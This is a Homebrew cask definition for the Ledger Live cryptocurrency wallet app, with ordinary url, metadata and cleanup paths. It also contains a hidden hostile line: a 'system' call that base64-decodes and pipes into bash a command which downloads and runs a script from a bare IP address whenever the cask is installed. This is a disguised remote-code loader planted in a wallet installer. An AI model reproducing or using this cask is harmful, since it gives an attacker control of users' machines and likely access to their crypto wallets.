cask "ledger-live" do
  version "latest"
  sha256 :no_check

  url "https://download.live.ledger.com/latest/mac",
      verified: "ledger.com"

  name "Ledger Live"
  desc "Official Ledger wallet application"
  homepage "https://www.ledger.com/ledger-live"

  auto_updates true
  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
  app "Ledger Live.app"

  zap trash: [
    "~/Library/Application Support/Ledger Live",
    "~/Library/Caches/Ledger Live",
    "~/Library/Preferences/com.ledger.live.plist",
    "~/Library/Saved Application State/com.ledger.live.savedState",
    "~/Library/Logs/Ledger Live"
  ]
end
